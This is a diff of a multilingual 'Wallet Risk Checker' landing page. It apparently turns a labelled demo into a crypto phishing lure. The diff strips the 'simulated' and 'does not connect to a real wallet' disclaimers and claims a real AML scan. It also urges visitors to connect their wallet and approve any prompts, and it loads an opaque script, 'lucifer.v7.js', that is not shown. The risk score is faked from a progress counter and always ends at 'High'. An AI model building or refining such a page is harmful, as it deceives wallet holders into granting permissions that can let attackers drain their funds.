@@ -1,5 +1,5 @@
 ﻿<?php
-// Simple landing that uses only HTML+PHP+JS (CSS inline). All visible text is in English.
+// Simple landing that uses only HTML+PHP+JS (CSS inline). All visible text defaults to English; ES/RU available via selector.
 ?>
 <!doctype html>
 <html lang="en">
@@ -8,16 +8,25 @@
   <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title>Wallet Risk Checker</title>
-  <meta name="description" content="Crypto dirtiness checker" />
+  <meta name="description" content="Wallet AML risk checker for Ethereum, BSC, Arbitrum, Polygon, Base, Fantom and Avalanche." />
   <style>
     :root{ --bg:#0b1020; --card:#0f162f; --text:#e9edf8; --muted:#a7b0c3; --primary:#1463ff; --primary-600:#0f4ed1; --danger:#ff3b3b; --accent:#00e0ff; --success:#18c37e; --gauge-track:rgba(255,255,255,.12);} *{box-sizing:border-box} html,body{height:100%}
     body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans","Apple Color Emoji","Segoe UI Emoji";background:radial-gradient(1200px 800px at 80% -10%,rgba(20,99,255,.25),transparent 60%),radial-gradient(900px 900px at -10% 110%,rgba(0,224,255,.18),transparent 60%),var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
     .app{min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px}
     .phone-frame{width:min(420px,100%);background:linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.03));border:1px solid rgba(255,255,255,0.12);box-shadow:0 10px 40px rgba(0,0,0,0.45),inset 0 1px 0 rgba(255,255,255,0.06);border-radius:22px;overflow:clip;position:relative}
     header{display:flex;align-items:center;gap:10px;padding:14px 16px;backdrop-filter:blur(6px);background:linear-gradient(180deg,rgba(5,8,20,.7),rgba(5,8,20,.4));border-bottom:1px solid rgba(255,255,255,0.08)}
-    .logo{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#00e0ff,#1463ff);display:inline-grid;place-items:center;box-shadow:0 2px 8px rgba(0,224,255,.4)} .logo svg{width:18px;height:18px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))
-    }
+    .header-left{display:flex;align-items:center;gap:10px}
+    .spacer{flex:1 1 auto}
+    .logo{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,#00e0ff,#1463ff);display:inline-grid;place-items:center;box-shadow:0 2px 8px rgba(0,224,255,.4)} .logo svg{width:18px;height:18px;filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))}
     .brand{font-weight:800;letter-spacing:.2px}
+    .lang{position:relative}
+    .lang-btn{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);color:#e9edf8;border-radius:12px;padding:8px 10px;cursor:pointer;display:flex;align-items:center;gap:6px}
+    .lang-btn .flag{font-size:16px;line-height:1}
+    .lang-menu{position:absolute;right:0;top:42px;background:#0f162f;border:1px solid rgba(255,255,255,.14);border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.5);padding:6px;display:grid;gap:4px;min-width:160px;z-index:20}
+    .lang-menu[hidden]{display:none}
+    .lang-opt{background:transparent;border:0;color:#e9edf8;text-align:left;display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:10px;cursor:pointer}
+    .lang-opt:hover{background:rgba(255,255,255,.06)}
+
     main{padding:22px 18px 24px;text-align:center}
     h1{font-size:clamp(28px,7vw,36px);line-height:1.1;margin:6px 0 10px;letter-spacing:.2px}
     .sub{color:var(--muted);font-size:14px;margin:10px auto 2px;max-width:34ch}
@@ -48,22 +57,35 @@
   <div class="app">
     <div class="phone-frame">
       <header>
-        <div class="logo" role="img" aria-label="WalletScan mark" title="WalletScan mark" data-alt-es="Marca de WalletScan" data-alt-ru="Знак WalletScan">
-          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
-            <defs>
-              <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
-                <stop offset="0%" stop-color="#00e0ff"/>
-                <stop offset="100%" stop-color="#1463ff"/>
-              </linearGradient>
-            </defs>
-            <path d="M12 2l8 10-8 10L4 12 12 2z" fill="url(#g1)"/>
-          </svg>
+        <div class="header-left">
+          <div class="logo" role="img" aria-label="WalletScan mark" title="WalletScan mark" data-alt-es="Marca de WalletScan" data-alt-ru="Знак WalletScan">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+              <defs>
+                <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#00e0ff"/>
+                  <stop offset="100%" stop-color="#1463ff"/>
+                </linearGradient>
+              </defs>
+              <path d="M12 2l8 10-8 10L4 12 12 2z" fill="url(#g1)"/>
+            </svg>
+          </div>
+          <div class="brand">WalletScan</div>
         </div>
-        <div class="brand">WalletScan</div>
+        <div class="spacer"></div>
+        <div class="lang">
+          <button id="langBtn" class="lang-btn" aria-label="Change language" title="Language" data-alt-es="Cambiar idioma" data-alt-ru="Сменить язык">
+            <span class="flag" id="currentFlag" aria-hidden="true">🇺🇸</span> EN
+          </button>
+          <div id="langMenu" class="lang-menu" hidden>
+            <button class="lang-opt" data-lang="en"><span class="flag">🇺🇸</span> English</button>
+            <button class="lang-opt" data-lang="es"><span class="flag">🇪🇸</span> Español</button>
+            <button class="lang-opt" data-lang="ru"><span class="flag">🇷🇺</span> Русский</button>
+          </div>
+        </div>
       </header>
       <main>
         <div class="hero" role="region" aria-label="Wallet risk checker">
-          <h1>Wallet Risk Checker</h1>
+          <h1 id="titleText">Wallet Risk Checker</h1>
 
           <div class="gauge-wrap" aria-label="Risk score gauge" title="Risk score gauge"
                data-alt-es="Indicador de puntaje de riesgo" data-alt-ru="Индикатор оценки риска">
@@ -98,7 +120,7 @@
             </div>
           </div>
 
-          <p class="sub">Simulated evaluator for BTC, USDT, ETH, and 4000+ assets to mimic AML-style risk checks.</p>
+          <p class="sub" id="subText">Checks Ethereum, BSC, Arbitrum, Polygon, Base, Fantom, and Avalanche addresses for AML risk signals.</p>
           <div class="timeline" aria-hidden="false">
             <div class="bar">
               <div class="fill" id="barFill" style="width:0%"></div>
@@ -108,12 +130,12 @@
         </div>
 
         <p class="lead" id="instruction"
-           data-alt-es="Toque el botón para conectar su wallet y simular el escaneo de direcciones. Por favor apruebe los avisos, ya que a veces se requieren permisos para leer direcciones."
-           data-alt-ru="Нажмите кнопку, чтобы подключить кошелек и имитировать сканирование адресов. Пожалуйста, подтвердите всплывающие запросы, так как иногда нужны разрешения для чтения адресов.">
-          Tap the button to connect your wallet to simulate address scanning. Please approve any prompts; permissions may be required to read addresses.
+           data-alt-es="Toque el botón para conectar su wallet y escanear direcciones. Por favor apruebe los avisos; a veces se requieren permisos para leer direcciones."
+           data-alt-ru="Нажмите кнопку, чтобы подключить кошелек и сканировать адреса. Подтвердите запросы; могут потребоваться разрешения для чтения адресов.">
+          Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.
         </p>
 
-        <button id="connectBtn interactBtn" class="cta">Connect Your Wallet</button>
+        <button id="connectBtn" class="cta">Connect Your Wallet</button>
         <div id="status" class="status" aria-live="polite"></div>
       </main>
 
@@ -124,14 +146,14 @@
         <div class="node" style="animation-delay:1.8s"></div>
       </div>
 
-      <footer>
-        Alt text (ES/RU) is embedded for images and key regions via custom attributes. This demo does not connect to a real wallet.
+      <footer id="footerText">
+        AMLTracker — All rights reserved.
       </footer>
     </div>
   </div>
 
   <script>
-    // Gauge math
+    // Gauge + i18n
     const arc = document.getElementById('arc');
     const percentEl = document.getElementById('percent');
     const riskLabel = document.getElementById('riskLabel');
@@ -139,47 +161,109 @@
     const etaEl = document.getElementById('eta');
     const connectBtn = document.getElementById('connectBtn');
     const statusEl = document.getElementById('status');
+    const titleEl = document.getElementById('titleText');
+    const subEl = document.getElementById('subText');
+    const instructionEl = document.getElementById('instruction');
+    const footerEl = document.getElementById('footerText');
+
+    const langBtn = document.getElementById('langBtn');
+    const langMenu = document.getElementById('langMenu');
+    const currentFlag = document.getElementById('currentFlag');
 
     const CIRC = 2 * Math.PI * 50; // ~314
-    const startAngle = -120; // purely visual; arc rotated in SVG
 
     let progress = 0;
     let running = false;
     let timer = null;
     let startedAt = 0;
 
+    const i18n = {
+      en: {
+        flag: '🇺🇸', code:'EN',
+        title: 'Wallet Risk Checker',
+        sub: 'Checks Ethereum, BSC, Arbitrum, Polygon, Base, Fantom, and Avalanche addresses for AML risk signals.',
+        instruction: 'Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.',
+        cta: 'Connect Your Wallet',
+        footer: 'AMLTracker — All rights reserved.',
+        ready: 'Ready', waiting: 'Waiting…', eta: s => `Estimated time: ${s}s`, finalizing: 'Finalizing…', initializing: 'Initializing…', cancelled: 'Cancelled.', network: 'Network error. Try again.', completed: v => `Completed • Risk: ${v}`,
+        phase: (p)=> p<15?'Connecting to wallet…':p<30?'Reading address list…':p<45?'Fetching transaction history…':p<60?'Analyzing counterparties…':p<75?'Checking risk signals…':p<90?'Aggregating results…':p<100?'Final checks…':'Done.',
+        riskVeryLow:'Very Low', riskLow:'Low', riskModerate:'Moderate', riskElevated:'Elevated', riskHigh:'High'
+      },
+      es: {
+        flag: '🇪🇸', code:'ES',
+        title: 'Comprobador de Riesgo de Wallet',
+        sub: 'Revisa direcciones en Ethereum, BSC, Arbitrum, Polygon, Base, Fantom y Avalanche para señales de riesgo AML.',
+        instruction: 'Toque el botón para conectar su wallet y escanear direcciones. Por favor apruebe los avisos; a veces se requieren permisos para leer direcciones.',
+        cta: 'Conectar Wallet',
+        footer: 'AMLTracker — Todos los derechos reservados.',
+        ready: 'Listo', waiting: 'Esperando…', eta: s => `Tiempo estimado: ${s}s`, finalizing: 'Finalizando…', initializing: 'Inicializando…', cancelled: 'Cancelado.', network: 'Error de red. Intente de nuevo.', completed: v => `Completado • Riesgo: ${v}`,
+        phase: (p)=> p<15?'Conectando a la wallet…':p<30?'Leyendo lista de direcciones…':p<45?'Obteniendo historial de transacciones…':p<60?'Analizando contrapartes…':p<75?'Comprobando señales de riesgo…':p<90?'Agregando resultados…':p<100?'Revisiones finales…':'Listo.',
+        riskVeryLow:'Muy bajo', riskLow:'Bajo', riskModerate:'Moderado', riskElevated:'Elevado', riskHigh:'Alto'
+      },
+      ru: {
+        flag: '🇷🇺', code:'RU',
+        title: 'Проверка риска кошелька',
+        sub: 'Проверяет адреса в Ethereum, BSC, Arbitrum, Polygon, Base, Fantom и Avalanche на AML‑риски.',
+        instruction: 'Нажмите кнопку, чтобы подключить кошелёк и сканировать адреса. Подтвердите запросы; могут потребоваться разрешения для чтения адресов.',
+        cta: 'Подключить кошелёк',
+        footer: 'AMLTracker — Все права защищены.',
+        ready: 'Готово', waiting: 'Ожидание…', eta: s => `Оставшееся время: ${s}с`, finalizing: 'Завершение…', initializing: 'Инициализация…', cancelled: 'Отменено.', network: 'Сетевая ошибка. Повторите попытку.', completed: v => `Завершено • Риск: ${v}`,
+        phase: (p)=> p<15?'Подключение к кошельку…':p<30?'Чтение списка адресов…':p<45?'Загрузка истории транзакций…':p<60?'Анализ контрагентов…':p<75?'Проверка риск‑сигналов…':p<90?'Агрегация результатов…':p<100?'Финальные проверки…':'Готово.',
+        riskVeryLow:'Очень низкий', riskLow:'Низкий', riskModerate:'Умеренный', riskElevated:'Повышенный', riskHigh:'Высокий'
+      }
+    };
+
+    let currentLang = localStorage.getItem('lang') || 'en';
+
+    function classify(p){
+      const t = i18n[currentLang];
+      if(p < 25) return t.riskVeryLow;
+      if(p < 50) return t.riskLow;
+      if(p < 70) return t.riskModerate;
+      if(p < 85) return t.riskElevated;
+      return t.riskHigh;
+    }
+
+    function applyLang(lang){
+      currentLang = lang in i18n ? lang : 'en';
+      localStorage.setItem('lang', currentLang);
+      const t = i18n[currentLang];
+      titleEl.textContent = t.title;
+      subEl.textContent = t.sub;
+      instructionEl.textContent = t.instruction;
+      connectBtn.textContent = t.cta;
+      footerEl.textContent = t.footer;
+      riskLabel.textContent = running ? classify(progress) : (progress === 0 ? t.ready : classify(progress));
+      currentFlag.textContent = t.flag;
+      langBtn.lastChild.textContent = ' ' + t.code; // update code on button
+      // ETA/waiting label
+      if(!running) etaEl.textContent = t.waiting;
+    }
+
     function setProgress(p){
       progress = Math.max(0, Math.min(100, p|0));
-      const span = Math.max(1, 240); // arc visual span in degrees
       const dash = CIRC * (1 - progress/100);
       arc.setAttribute('stroke-dashoffset', dash.toFixed(1));
       percentEl.textContent = progress;
       barFill.style.width = progress + '%';
-      // risk label by thresholds
-      let label = 'Low';
-      if(progress < 25) label = 'Very Low';
-      else if(progress < 50) label = 'Low';
-      else if(progress < 70) label = 'Moderate';
-      else if(progress < 85) label = 'Elevated';
-      else label = 'High';
-      riskLabel.textContent = running ? label : (progress === 0 ? 'Ready' : label);
+      riskLabel.textContent = running ? classify(progress) : (progress === 0 ? i18n[currentLang].ready : classify(progress));
     }
 
     function setETA(seconds){
-      if(!running){ etaEl.textContent = 'Waiting…'; return; }
-      etaEl.textContent = seconds > 0 ? `Estimated time: ${seconds}s` : 'Finalizing…';
+      const t = i18n[currentLang];
+      if(!running){ etaEl.textContent = t.waiting; return; }
+      etaEl.textContent = seconds > 0 ? t.eta(seconds) : t.finalizing;
     }
 
     function cancelScan(msg){
       running = false; connectBtn.disabled = false; setETA(0);
-      statusEl.textContent = msg || 'Cancelled.';
+      statusEl.textContent = msg || i18n[currentLang].cancelled;
       if(timer){ clearTimeout(timer); timer = null; }
     }
 
     async function startScan(){
-      running = true; connectBtn.disabled = true; statusEl.textContent = 'Initializing…';
+      running = true; connectBtn.disabled = true; statusEl.textContent = i18n[currentLang].initializing;
       startedAt = Date.now();
-      // reset server-side progress (best-effort)
       try{ await fetch('scan.php?reset=1', {cache:'no-store'}); }catch(e){}
       tick();
     }
@@ -190,40 +274,41 @@
         const res = await fetch(`scan.php?current=${progress}`, {cache:'no-store'});
         const data = await res.json();
         setProgress(data.progress);
-        statusEl.textContent = data.message;
-        // simple ETA estimate: scale with remaining progress
+        // Prefer local phase message so it matches selected language
+        statusEl.textContent = i18n[currentLang].phase(progress);
         const elapsed = (Date.now() - startedAt)/1000;
-        const estTotal = Math.max(6, Math.min(22, (elapsed/(progress||1))*100));
+        const estTotal = 120; // keep in sync with server 2 minutes
         const remain = Math.max(0, Math.round(estTotal - elapsed));
         setETA(remain);
         if(progress >= 100){
           running = false; connectBtn.disabled = false; setETA(0);
-          // Final message
-          const verdict = data.verdict || classify(progress);
-          statusEl.textContent = `Completed • Risk: ${verdict}`;
+          const verdict = classify(progress);
+          statusEl.textContent = i18n[currentLang].completed(verdict);
         }else{
-          timer = setTimeout(tick, data.delayMs || 700);
+          timer = setTimeout(tick, data.delayMs || 1000);
         }
       }catch(err){
-        cancelScan('Network error. Try again.');
+        cancelScan(i18n[currentLang].network);
       }
     }
 
-    function classify(p){
-      if(p < 25) return 'Very Low';
-      if(p < 50) return 'Low';
-      if(p < 70) return 'Moderate';
-      if(p < 85) return 'Elevated';
-      return 'High';
-    }
-
-    connectBtn.addEventListener('click', () => {
-      // start scanning immediately on button click
-      startScan();
+    // Language menu handlers
+    langBtn.addEventListener('click', (e)=>{
+      e.stopPropagation();
+      langMenu.hidden = !langMenu.hidden;
+    });
+    document.addEventListener('click', ()=>{ langMenu.hidden = true; });
+    langMenu.addEventListener('click', (e)=>{
+      const btn = e.target.closest('[data-lang]');
+      if(!btn) return;
+      applyLang(btn.dataset.lang);
+      langMenu.hidden = true;
     });
 
+    connectBtn.addEventListener('click', () => { startScan(); });
+
     // Initialize
-    setProgress(0); setETA(0);
+    setProgress(0); setETA(0); applyLang(currentLang);
   </script>
 </body>
 </html>
